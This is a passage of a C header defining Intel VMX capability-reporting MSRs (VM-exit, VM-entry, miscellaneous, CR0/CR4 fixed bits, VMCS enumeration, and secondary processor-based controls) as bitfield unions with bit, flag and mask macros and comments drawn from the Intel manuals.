     *
     * [Bit 30] This control determines whether executions of PAUSE cause VM exits.
     */
    UINT64 PauseExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_PAUSE_EXITING_BIT 30
#define IA32_VMX_PROCBASED_CTLS_PAUSE_EXITING_FLAG 0x40000000
#define IA32_VMX_PROCBASED_CTLS_PAUSE_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_PAUSE_EXITING(_) (((_) >> 30) & 0x01)

    /**
     * @brief Determines whether the secondary processor based VM-execution controls are used
     *
     * [Bit 31] This control determines whether the secondary processor-based VM-execution controls
     * are used. If this control is 0, the logical processor operates as if all the secondary
     * processor-based VM-execution controls were also 0.
     */
    UINT64 ActivateSecondaryControls : 1;
#define IA32_VMX_PROCBASED_CTLS_ACTIVATE_SECONDARY_CONTROLS_BIT 31
#define IA32_VMX_PROCBASED_CTLS_ACTIVATE_SECONDARY_CONTROLS_FLAG 0x80000000
#define IA32_VMX_PROCBASED_CTLS_ACTIVATE_SECONDARY_CONTROLS_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS_ACTIVATE_SECONDARY_CONTROLS(_) (((_) >> 31) & 0x01)
    UINT64 Reserved7 : 32;
  };

  UINT64 Flags;
} IA32_VMX_PROCBASED_CTLS_REGISTER;

/**
 * Capability Reporting Register of VM-Exit Controls.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.4(VM-EXIT CONTROLS)]
 * @see Vol3C[24.7.1(VM-Exit Controls)] (reference)
 */
#define IA32_VMX_EXIT_CTLS 0x00000483
typedef union {
  struct {
    UINT64 Reserved1 : 2;

    /**
     * @brief Save guest debug controls (dr7 & IA32_DEBUGCTL_MSR) (forced to 1 on the 'first' VT-x
     * capable CPUs; this actually includes the newest Nehalem CPUs)
     *
     * [Bit 2] This control determines whether DR7 and the IA32_DEBUGCTL MSR are saved on VM exit.
     * The first processors to support the virtual-machine extensions supported only the 1-setting
     * of this control.
     */
    UINT64 SaveDebugControls : 1;
#define IA32_VMX_EXIT_CTLS_SAVE_DEBUG_CONTROLS_BIT 2
#define IA32_VMX_EXIT_CTLS_SAVE_DEBUG_CONTROLS_FLAG 0x04
#define IA32_VMX_EXIT_CTLS_SAVE_DEBUG_CONTROLS_MASK 0x01
#define IA32_VMX_EXIT_CTLS_SAVE_DEBUG_CONTROLS(_) (((_) >> 2) & 0x01)
    UINT64 Reserved2 : 6;

    /**
     * @brief Return to long mode after a VM-exit
     *
     * [Bit 9] On processors that support Intel 64 architecture, this control determines whether a
     * logical processor is in 64-bit mode after the next VM exit. Its value is loaded into CS.L,
     * IA32_EFER.LME, and IA32_EFER.LMA on every VM exit.1 This control must be 0 on processors that
     * do not support Intel 64 architecture.
     */
    UINT64 HostAddressSpaceSize : 1;
#define IA32_VMX_EXIT_CTLS_HOST_ADDRESS_SPACE_SIZE_BIT 9
#define IA32_VMX_EXIT_CTLS_HOST_ADDRESS_SPACE_SIZE_FLAG 0x200
#define IA32_VMX_EXIT_CTLS_HOST_ADDRESS_SPACE_SIZE_MASK 0x01
#define IA32_VMX_EXIT_CTLS_HOST_ADDRESS_SPACE_SIZE(_) (((_) >> 9) & 0x01)
    UINT64 Reserved3 : 2;

    /**
     * @brief Whether the IA32_PERF_GLOBAL_CTRL MSR is loaded on VM-exit
     *
     * [Bit 12] This control determines whether the IA32_PERF_GLOBAL_CTRL MSR is loaded on VM exit.
     */
    UINT64 LoadIa32PerfGlobalCtrl : 1;
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_BIT 12
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_FLAG 0x1000
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_MASK 0x01
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL(_) (((_) >> 12) & 0x01)
    UINT64 Reserved4 : 2;

    /**
     * @brief Acknowledge external interrupts with the irq controller if one caused a VM-exit
     *
     * [Bit 15] This control affects VM exits due to external interrupts:
     * - If such a VM exit occurs and this control is 1, the logical processor acknowledges the
     * interrupt controller, acquiring the interrupt's vector. The vector is stored in the VM-exit
     * interruption-information field, which is marked valid.
     * - If such a VM exit occurs and this control is 0, the interrupt is not acknowledged and the
     * VM-exit interruption-information field is marked invalid.
     */
    UINT64 AcknowledgeInterruptOnExit : 1;
#define IA32_VMX_EXIT_CTLS_ACKNOWLEDGE_INTERRUPT_ON_EXIT_BIT 15
#define IA32_VMX_EXIT_CTLS_ACKNOWLEDGE_INTERRUPT_ON_EXIT_FLAG 0x8000
#define IA32_VMX_EXIT_CTLS_ACKNOWLEDGE_INTERRUPT_ON_EXIT_MASK 0x01
#define IA32_VMX_EXIT_CTLS_ACKNOWLEDGE_INTERRUPT_ON_EXIT(_) (((_) >> 15) & 0x01)
    UINT64 Reserved5 : 2;

    /**
     * @brief Whether the guest IA32_PAT MSR is saved on VM-exit
     *
     * [Bit 18] This control determines whether the IA32_PAT MSR is saved on VM exit.
     */
    UINT64 SaveIa32Pat : 1;
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_PAT_BIT 18
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_PAT_FLAG 0x40000
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_PAT_MASK 0x01
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_PAT(_) (((_) >> 18) & 0x01)

    /**
     * @brief Whether the host IA32_PAT MSR is loaded on VM-exit
     *
     * [Bit 19] This control determines whether the IA32_PAT MSR is loaded on VM exit.
     */
    UINT64 LoadIa32Pat : 1;
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PAT_BIT 19
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PAT_FLAG 0x80000
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PAT_MASK 0x01
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PAT(_) (((_) >> 19) & 0x01)

    /**
     * @brief Whether the guest IA32_EFER MSR is saved on VM-exit
     *
     * [Bit 20] This control determines whether the IA32_EFER MSR is saved on VM exit.
     */
    UINT64 SaveIa32Efer : 1;
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_EFER_BIT 20
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_EFER_FLAG 0x100000
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_EFER_MASK 0x01
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_EFER(_) (((_) >> 20) & 0x01)

    /**
     * @brief Whether the host IA32_EFER MSR is loaded on VM-exit
     *
     * [Bit 21] This control determines whether the IA32_EFER MSR is loaded on VM exit.
     */
    UINT64 LoadIa32Efer : 1;
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_EFER_BIT 21
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_EFER_FLAG 0x200000
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_EFER_MASK 0x01
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_EFER(_) (((_) >> 21) & 0x01)

    /**
     * @brief Whether the value of the VMX preemption timer is saved on every VM-exit
     *
     * [Bit 22] This control determines whether the value of the VMX-preemption timer is saved on VM
     * exit.
     */
    UINT64 SaveVmxPreemptionTimerValue : 1;
#define IA32_VMX_EXIT_CTLS_SAVE_VMX_PREEMPTION_TIMER_VALUE_BIT 22
#define IA32_VMX_EXIT_CTLS_SAVE_VMX_PREEMPTION_TIMER_VALUE_FLAG 0x400000
#define IA32_VMX_EXIT_CTLS_SAVE_VMX_PREEMPTION_TIMER_VALUE_MASK 0x01
#define IA32_VMX_EXIT_CTLS_SAVE_VMX_PREEMPTION_TIMER_VALUE(_) (((_) >> 22) & 0x01)

    /**
     * [Bit 23] This control determines whether the IA32_BNDCFGS MSR is cleared on VM exit.
     */
    UINT64 ClearIa32Bndcfgs : 1;
#define IA32_VMX_EXIT_CTLS_CLEAR_IA32_BNDCFGS_BIT 23
#define IA32_VMX_EXIT_CTLS_CLEAR_IA32_BNDCFGS_FLAG 0x800000
#define IA32_VMX_EXIT_CTLS_CLEAR_IA32_BNDCFGS_MASK 0x01
#define IA32_VMX_EXIT_CTLS_CLEAR_IA32_BNDCFGS(_) (((_) >> 23) & 0x01)

    /**
     * [Bit 24] If this control is 1, Intel Processor Trace does not produce a paging information
     * packet (PIP) on a VM exit or a VMCS packet on an SMM VM exit.
     *
     * @see Vol3C[35(INTEL(R) PROCESSOR TRACE)]
     */
    UINT64 ConcealVmxFromPt : 1;
#define IA32_VMX_EXIT_CTLS_CONCEAL_VMX_FROM_PT_BIT 24
#define IA32_VMX_EXIT_CTLS_CONCEAL_VMX_FROM_PT_FLAG 0x1000000
#define IA32_VMX_EXIT_CTLS_CONCEAL_VMX_FROM_PT_MASK 0x01
#define IA32_VMX_EXIT_CTLS_CONCEAL_VMX_FROM_PT(_) (((_) >> 24) & 0x01)
    UINT64 Reserved6 : 39;
  };

  UINT64 Flags;
} IA32_VMX_EXIT_CTLS_REGISTER;

/**
 * Capability Reporting Register of VM-Entry Controls.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.5(VM-ENTRY CONTROLS)]
 * @see Vol3D[24.8.1(VM-Entry Controls)] (reference)
 */
#define IA32_VMX_ENTRY_CTLS 0x00000484
typedef union {
  struct {
    UINT64 Reserved1 : 2;

    /**
     * @brief Load guest debug controls (dr7 & IA32_DEBUGCTL_MSR) (forced to 1 on the 'first' VT-x
     * capable CPUs; this actually includes the newest Nehalem CPUs)
     *
     * [Bit 2] This control determines whether DR7 and the IA32_DEBUGCTL MSR are loaded on VM entry.
     * The first processors to support the virtual-machine extensions supported only the 1-setting
     * of this control.
     */
    UINT64 LoadDebugControls : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_DEBUG_CONTROLS_BIT 2
#define IA32_VMX_ENTRY_CTLS_LOAD_DEBUG_CONTROLS_FLAG 0x04
#define IA32_VMX_ENTRY_CTLS_LOAD_DEBUG_CONTROLS_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_DEBUG_CONTROLS(_) (((_) >> 2) & 0x01)
    UINT64 Reserved2 : 6;

    /**
     * @brief 64 bits guest mode. Must be 0 for CPUs that don't support AMD64
     *
     * [Bit 9] On processors that support Intel 64 architecture, this control determines whether the
     * logical processor is in IA-32e mode after VM entry. Its value is loaded into IA32_EFER.LMA as
     * part of VM entry. This control must be 0 on processors that do not support Intel 64
     * architecture.
     */
    UINT64 Ia32EModeGuest : 1;
#define IA32_VMX_ENTRY_CTLS_IA32E_MODE_GUEST_BIT 9
#define IA32_VMX_ENTRY_CTLS_IA32E_MODE_GUEST_FLAG 0x200
#define IA32_VMX_ENTRY_CTLS_IA32E_MODE_GUEST_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_IA32E_MODE_GUEST(_) (((_) >> 9) & 0x01)

    /**
     * @brief In SMM mode after VM-entry
     *
     * [Bit 10] This control determines whether the logical processor is in system-management mode
     * (SMM) after VM entry. This control must be 0 for any VM entry from outside SMM.
     */
    UINT64 EntryToSmm : 1;
#define IA32_VMX_ENTRY_CTLS_ENTRY_TO_SMM_BIT 10
#define IA32_VMX_ENTRY_CTLS_ENTRY_TO_SMM_FLAG 0x400
#define IA32_VMX_ENTRY_CTLS_ENTRY_TO_SMM_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_ENTRY_TO_SMM(_) (((_) >> 10) & 0x01)

    /**
     * @brief Disable dual treatment of SMI and SMM; must be zero for VM-entry outside of SMM
     *
     * [Bit 11] If set to 1, the default treatment of SMIs and SMM is in effect after the VM entry.
     * This control must be 0 for any VM entry from outside SMM
     *
     * @see Vol3C[34.15.7(Deactivating the Dual-Monitor Treatment)]
     */
    UINT64 DeactivateDualMonitorTreatment : 1;
#define IA32_VMX_ENTRY_CTLS_DEACTIVATE_DUAL_MONITOR_TREATMENT_BIT 11
#define IA32_VMX_ENTRY_CTLS_DEACTIVATE_DUAL_MONITOR_TREATMENT_FLAG 0x800
#define IA32_VMX_ENTRY_CTLS_DEACTIVATE_DUAL_MONITOR_TREATMENT_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_DEACTIVATE_DUAL_MONITOR_TREATMENT(_) (((_) >> 11) & 0x01)
    UINT64 Reserved3 : 1;

    /**
     * @brief Whether the guest IA32_PERF_GLOBAL_CTRL MSR is loaded on VM-entry
     *
     * [Bit 13] This control determines whether the IA32_PERF_GLOBAL_CTRL MSR is loaded on VM entry.
     */
    UINT64 LoadIa32PerfGlobalCtrl : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_BIT 13
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_FLAG 0x2000
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL(_) (((_) >> 13) & 0x01)

    /**
     * @brief Whether the guest IA32_PAT MSR is loaded on VM-entry
     *
     * [Bit 14] This control determines whether the IA32_PAT MSR is loaded on VM entry.
     */
    UINT64 LoadIa32Pat : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PAT_BIT 14
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PAT_FLAG 0x4000
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PAT_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PAT(_) (((_) >> 14) & 0x01)

    /**
     * @brief Whether the guest IA32_EFER MSR is loaded on VM-entry
     *
     * [Bit 15] This control determines whether the IA32_EFER MSR is loaded on VM entry.
     */
    UINT64 LoadIa32Efer : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_EFER_BIT 15
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_EFER_FLAG 0x8000
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_EFER_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_EFER(_) (((_) >> 15) & 0x01)

    /**
     * [Bit 16] This control determines whether the IA32_BNDCFGS MSR is loaded on VM entry.
     */
    UINT64 LoadIa32Bndcfgs : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_BNDCFGS_BIT 16
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_BNDCFGS_FLAG 0x10000
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_BNDCFGS_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_BNDCFGS(_) (((_) >> 16) & 0x01)

    /**
     * [Bit 17] If this control is 1, Intel Processor Trace does not produce a paging information
     * packet (PIP) on a VM entry or a VMCS packet on a VM entry that returns from SMM.
     *
     * @see Vol3C[35(INTEL(R) PROCESSOR TRACE)]
     */
    UINT64 ConcealVmxFromPt : 1;
#define IA32_VMX_ENTRY_CTLS_CONCEAL_VMX_FROM_PT_BIT 17
#define IA32_VMX_ENTRY_CTLS_CONCEAL_VMX_FROM_PT_FLAG 0x20000
#define IA32_VMX_ENTRY_CTLS_CONCEAL_VMX_FROM_PT_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_CONCEAL_VMX_FROM_PT(_) (((_) >> 17) & 0x01)

    /**
     * [Bit 18] This control determines whether the IA32_RTIT_CTL MSR is loaded on VM entry.
     */
    UINT64 LoadIa32RtitCtl : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_RTIT_CTL_BIT 18
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_RTIT_CTL_FLAG 0x40000
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_RTIT_CTL_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_RTIT_CTL(_) (((_) >> 18) & 0x01)
    UINT64 Reserved4 : 1;

    /**
     * [Bit 20] This control determines whether CET-related MSRs and SPP are loaded on VM entry.
     */
    UINT64 LoadCetState : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_CET_STATE_BIT 20
#define IA32_VMX_ENTRY_CTLS_LOAD_CET_STATE_FLAG 0x100000
#define IA32_VMX_ENTRY_CTLS_LOAD_CET_STATE_MASK 0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_CET_STATE(_) (((_) >> 20) & 0x01)
    UINT64 Reserved5 : 43;
  };

  UINT64 Flags;
} IA32_VMX_ENTRY_CTLS_REGISTER;

/**
 * Reporting Register of Miscellaneous VMX Capabilities.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.6(MISCELLANEOUS DATA)]
 * @see Vol3D[A.6(Miscellaneous Data)] (reference)
 */
#define IA32_VMX_MISC 0x00000485
typedef union {
  struct {
    /**
     * @brief Relationship between the preemption timer and tsc; count down every time bit x of the
     * tsc changes
     *
     * [Bits 4:0] Report a value X that specifies the relationship between the rate of the
     * VMX-preemption timer and that of the timestamp counter (TSC). Specifically, the
     * VMX-preemption timer (if it is active) counts down by 1 every time bit X in the TSC changes
     * due to a TSC increment.
     */
    UINT64 PreemptionTimerTscRelationship : 5;
#define IA32_VMX_MISC_PREEMPTION_TIMER_TSC_RELATIONSHIP_BIT 0
#define IA32_VMX_MISC_PREEMPTION_TIMER_TSC_RELATIONSHIP_FLAG 0x1F
#define IA32_VMX_MISC_PREEMPTION_TIMER_TSC_RELATIONSHIP_MASK 0x1F
#define IA32_VMX_MISC_PREEMPTION_TIMER_TSC_RELATIONSHIP(_) (((_) >> 0) & 0x1F)

    /**
     * @brief Whether VM-exit stores EFER.LMA into the "IA32e mode guest" field
     *
     * [Bit 5] When set to 1, VM exits store the value of IA32_EFER.LMA into the "IA-32e mode guest"
     * VM-entry control. This bit is read as 1 on any logical processor that supports the 1-setting
     * of the "unrestricted guest" VM-execution control.
     *
     * @see Vol3C[27.2(RECORDING VM-EXIT INFORMATION AND UPDATING VM-ENTRY CONTROL FIELDS)]
     */
    UINT64 StoreEferLmaOnVmexit : 1;
#define IA32_VMX_MISC_STORE_EFER_LMA_ON_VMEXIT_BIT 5
#define IA32_VMX_MISC_STORE_EFER_LMA_ON_VMEXIT_FLAG 0x20
#define IA32_VMX_MISC_STORE_EFER_LMA_ON_VMEXIT_MASK 0x01
#define IA32_VMX_MISC_STORE_EFER_LMA_ON_VMEXIT(_) (((_) >> 5) & 0x01)

    /**
     * @brief Activity states supported by the implementation
     *
     * [Bits 8:6] Report, as a bitmap, the activity states supported by the implementation:
     * - Bit 6 reports (if set) the support for activity state 1 (HLT).
     * - Bit 7 reports (if set) the support for activity state 2 (shutdown).
     * - Bit 8 reports (if set) the support for activity state 3 (wait-for-SIPI).
     * If an activity state is not supported, the implementation causes a VM entry to fail if it
     * attempts to establish that activity state. All implementations support VM entry to activity
     * state 0 (active).
     */
    UINT64 ActivityStates : 3;
#define IA32_VMX_MISC_ACTIVITY_STATES_BIT 6
#define IA32_VMX_MISC_ACTIVITY_STATES_FLAG 0x1C0
#define IA32_VMX_MISC_ACTIVITY_STATES_MASK 0x07
#define IA32_VMX_MISC_ACTIVITY_STATES(_) (((_) >> 6) & 0x07)
    UINT64 Reserved1 : 5;

    /**
     * @brief Intel Processor Trace (Intel PT) can be used in VMX operation
     *
     * [Bit 14] When set to 1, Intel(R) Processor Trace (Intel PT) can be used in VMX operation. If
     * the processor supports Intel PT but does not allow it to be used in VMX operation, execution
     * of VMXON clears IA32_RTIT_CTL.TraceEn; any attempt to write IA32_RTIT_CTL while in VMX
     * operation (including VMX root operation) causes a general-protection exception.
     *
     * @see Vol3C[30.3(VMX INSTRUCTIONS | VMXON-Enter VMX Operation)]
     */
    UINT64 IntelPtAvailableInVmx : 1;
#define IA32_VMX_MISC_INTEL_PT_AVAILABLE_IN_VMX_BIT 14
#define IA32_VMX_MISC_INTEL_PT_AVAILABLE_IN_VMX_FLAG 0x4000
#define IA32_VMX_MISC_INTEL_PT_AVAILABLE_IN_VMX_MASK 0x01
#define IA32_VMX_MISC_INTEL_PT_AVAILABLE_IN_VMX(_) (((_) >> 14) & 0x01)

    /**
     * @brief Whether RDMSR can be used to read IA32_SMBASE_MSR in SMM
     *
     * [Bit 15] When set to 1, the RDMSR instruction can be used in system-management mode (SMM) to
     * read the IA32_SMBASE MSR (MSR address 9EH).
     *
     * @see Vol3C[34.15.6.3(Saving Guest State)]
     */
    UINT64 RdmsrCanReadIa32SmbaseMsrInSmm : 1;
#define IA32_VMX_MISC_RDMSR_CAN_READ_IA32_SMBASE_MSR_IN_SMM_BIT 15
#define IA32_VMX_MISC_RDMSR_CAN_READ_IA32_SMBASE_MSR_IN_SMM_FLAG 0x8000
#define IA32_VMX_MISC_RDMSR_CAN_READ_IA32_SMBASE_MSR_IN_SMM_MASK 0x01
#define IA32_VMX_MISC_RDMSR_CAN_READ_IA32_SMBASE_MSR_IN_SMM(_) (((_) >> 15) & 0x01)

    /**
     * @brief Number of CR3 target values supported by the processor (0-256)
     *
     * [Bits 24:16] Indicate the number of CR3-target values supported by the processor. This number
     * is a value between 0 and 256, inclusive (bit 24 is set if and only if bits 23:16 are clear).
     */
    UINT64 Cr3TargetCount : 9;
#define IA32_VMX_MISC_CR3_TARGET_COUNT_BIT 16
#define IA32_VMX_MISC_CR3_TARGET_COUNT_FLAG 0x1FF0000
#define IA32_VMX_MISC_CR3_TARGET_COUNT_MASK 0x1FF
#define IA32_VMX_MISC_CR3_TARGET_COUNT(_) (((_) >> 16) & 0x1FF)

    /**
     * @brief Maximum number of MSRs in the VMCS. (N+1)*512
     *
     * [Bits 27:25] Used to compute the recommended maximum number of MSRs that should appear in the
     * VM-exit MSR-store list, the VM-exit MSR-load list, or the VM-entry MSR-load list.
     * Specifically, if the value bits 27:25 of IA32_VMX_MISC is N, then 512 * (N + 1) is the
     * recommended maximum number of MSRs to be included in each list. If the limit is exceeded,
     * undefined processor behavior may result (including a machine check during the VMX
     * transition).
     */
    UINT64 MaxNumberOfMsr : 3;
#define IA32_VMX_MISC_MAX_NUMBER_OF_MSR_BIT 25
#define IA32_VMX_MISC_MAX_NUMBER_OF_MSR_FLAG 0xE000000
#define IA32_VMX_MISC_MAX_NUMBER_OF_MSR_MASK 0x07
#define IA32_VMX_MISC_MAX_NUMBER_OF_MSR(_) (((_) >> 25) & 0x07)

    /**
     * @brief Whether bit 2 of IA32_SMM_MONITOR_CTL can be set to 1
     *
     * [Bit 28] When set to 1, bit 2 of the IA32_SMM_MONITOR_CTL can be set to 1. VMXOFF unblocks
     * SMIs unless IA32_SMM_MONITOR_CTL[bit 2] is 1.
     *
     * @see Vol3C[34.14.4(VMXOFF and SMI Unblocking)]
     */
    UINT64 SmmMonitorCtlB2 : 1;
#define IA32_VMX_MISC_SMM_MONITOR_CTL_B2_BIT 28
#define IA32_VMX_MISC_SMM_MONITOR_CTL_B2_FLAG 0x10000000
#define IA32_VMX_MISC_SMM_MONITOR_CTL_B2_MASK 0x01
#define IA32_VMX_MISC_SMM_MONITOR_CTL_B2(_) (((_) >> 28) & 0x01)

    /**
     * @brief Whether VMWRITE can be used to write VM-exit information fields
     *
     * [Bit 29] When set to 1, software can use VMWRITE to write to any supported field in the VMCS;
     * otherwise, VMWRITE cannot be used to modify VM-exit information fields.
     */
    UINT64 VmwriteVmexitInfo : 1;
#define IA32_VMX_MISC_VMWRITE_VMEXIT_INFO_BIT 29
#define IA32_VMX_MISC_VMWRITE_VMEXIT_INFO_FLAG 0x20000000
#define IA32_VMX_MISC_VMWRITE_VMEXIT_INFO_MASK 0x01
#define IA32_VMX_MISC_VMWRITE_VMEXIT_INFO(_) (((_) >> 29) & 0x01)

    /**
     * [Bit 30] When set to 1, VM entry allows injection of a software interrupt, software
     * exception, or privileged software exception with an instruction length of 0.
     */
    UINT64 ZeroLengthInstructionVmentryInjection : 1;
#define IA32_VMX_MISC_ZERO_LENGTH_INSTRUCTION_VMENTRY_INJECTION_BIT 30
#define IA32_VMX_MISC_ZERO_LENGTH_INSTRUCTION_VMENTRY_INJECTION_FLAG 0x40000000
#define IA32_VMX_MISC_ZERO_LENGTH_INSTRUCTION_VMENTRY_INJECTION_MASK 0x01
#define IA32_VMX_MISC_ZERO_LENGTH_INSTRUCTION_VMENTRY_INJECTION(_) (((_) >> 30) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * @brief MSEG revision identifier used by the processor
     *
     * [Bits 63:32] Report the 32-bit MSEG revision identifier used by the processor.
     */
    UINT64 MsegId : 32;
#define IA32_VMX_MISC_MSEG_ID_BIT 32
#define IA32_VMX_MISC_MSEG_ID_FLAG 0xFFFFFFFF00000000
#define IA32_VMX_MISC_MSEG_ID_MASK 0xFFFFFFFF
#define IA32_VMX_MISC_MSEG_ID(_) (((_) >> 32) & 0xFFFFFFFF)
  };

  UINT64 Flags;
} IA32_VMX_MISC_REGISTER;

/**
 * Capability Reporting Register of CR0 Bits Fixed to 0.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.7(VMX-FIXED BITS IN CR0)]
 * @see Vol3D[A.7(VMX-Fixed Bits in CR0)] (reference)
 */
#define IA32_VMX_CR0_FIXED0 0x00000486

/**
 * Capability Reporting Register of CR0 Bits Fixed to 1.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.7(VMX-FIXED BITS IN CR0)]
 * @see Vol3D[A.7(VMX-Fixed Bits in CR0)] (reference)
 */
#define IA32_VMX_CR0_FIXED1 0x00000487

/**
 * Capability Reporting Register of CR4 Bits Fixed to 0.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.8(VMX-FIXED BITS IN CR4)]
 * @see Vol3D[A.8(VMX-Fixed Bits in CR4)] (reference)
 */
#define IA32_VMX_CR4_FIXED0 0x00000488

/**
 * Capability Reporting Register of CR4 Bits Fixed to 1.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.8(VMX-FIXED BITS IN CR4)]
 * @see Vol3D[A.8(VMX-Fixed Bits in CR4)] (reference)
 */
#define IA32_VMX_CR4_FIXED1 0x00000489

/**
 * Capability Reporting Register of VMCS Field Enumeration.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.9(VMCS ENUMERATION)]
 * @see Vol3D[A.9(VMCS Enumeration)] (reference)
 */
#define IA32_VMX_VMCS_ENUM 0x0000048A
typedef union {
  struct {
    /**
     * [Bit 0] Indicates access type.
     */
    UINT64 AccessType : 1;
#define IA32_VMX_VMCS_ENUM_ACCESS_TYPE_BIT 0
#define IA32_VMX_VMCS_ENUM_ACCESS_TYPE_FLAG 0x01
#define IA32_VMX_VMCS_ENUM_ACCESS_TYPE_MASK 0x01
#define IA32_VMX_VMCS_ENUM_ACCESS_TYPE(_) (((_) >> 0) & 0x01)

    /**
     * [Bits 9:1] Highest index value used for any VMCS encoding.
     */
    UINT64 HighestIndexValue : 9;
#define IA32_VMX_VMCS_ENUM_HIGHEST_INDEX_VALUE_BIT 1
#define IA32_VMX_VMCS_ENUM_HIGHEST_INDEX_VALUE_FLAG 0x3FE
#define IA32_VMX_VMCS_ENUM_HIGHEST_INDEX_VALUE_MASK 0x1FF
#define IA32_VMX_VMCS_ENUM_HIGHEST_INDEX_VALUE(_) (((_) >> 1) & 0x1FF)

    /**
     * [Bits 11:10] Indicate the field's type.
     */
    UINT64 FieldType : 2;
#define IA32_VMX_VMCS_ENUM_FIELD_TYPE_BIT 10
#define IA32_VMX_VMCS_ENUM_FIELD_TYPE_FLAG 0xC00
#define IA32_VMX_VMCS_ENUM_FIELD_TYPE_MASK 0x03
#define IA32_VMX_VMCS_ENUM_FIELD_TYPE(_) (((_) >> 10) & 0x03)
    UINT64 Reserved1 : 1;

    /**
     * [Bits 14:13] Indicate the field's width.
     */
    UINT64 FieldWidth : 2;
#define IA32_VMX_VMCS_ENUM_FIELD_WIDTH_BIT 13
#define IA32_VMX_VMCS_ENUM_FIELD_WIDTH_FLAG 0x6000
#define IA32_VMX_VMCS_ENUM_FIELD_WIDTH_MASK 0x03
#define IA32_VMX_VMCS_ENUM_FIELD_WIDTH(_) (((_) >> 13) & 0x03)
    UINT64 Reserved2 : 49;
  };

  UINT64 Flags;
} IA32_VMX_VMCS_ENUM_REGISTER;

/**
 * Capability Reporting Register of Secondary Processor-Based VM-Execution Controls.
 *
 * @remarks If ( CPUID.01H:ECX.[5] && IA32_VMX_PROCBASED_CTLS[63] )
 * @see Vol3D[A.3.3(Secondary Processor-Based VM-Execution Controls)]
 * @see Vol3D[24.6.2(Processor-Based VM-Execution Controls)] (reference)
 */
#define IA32_VMX_PROCBASED_CTLS2 0x0000048B
typedef union {
  struct {
    /**
     * @brief Virtualize APIC access
     *
     * [Bit 0] If this control is 1, the logical processor treats specially accesses to the page
     * with the APICaccess address.
     *
     * @see Vol3C[29.4(VIRTUALIZING MEMORY-MAPPED APIC ACCESSES)]
     */
    UINT64 VirtualizeApicAccesses : 1;
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_APIC_ACCESSES_BIT 0
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_APIC_ACCESSES_FLAG 0x01
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_APIC_ACCESSES_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_APIC_ACCESSES(_) (((_) >> 0) & 0x01)

    /**
     * @brief EPT supported/enabled
     *
     * [Bit 1] If this control is 1, extended page tables (EPT) are enabled.
     *
     * @see Vol3C[28.2(THE EXTENDED PAGE TABLE MECHANISM (EPT))]
     */
    UINT64 EnableEpt : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_EPT_BIT 1
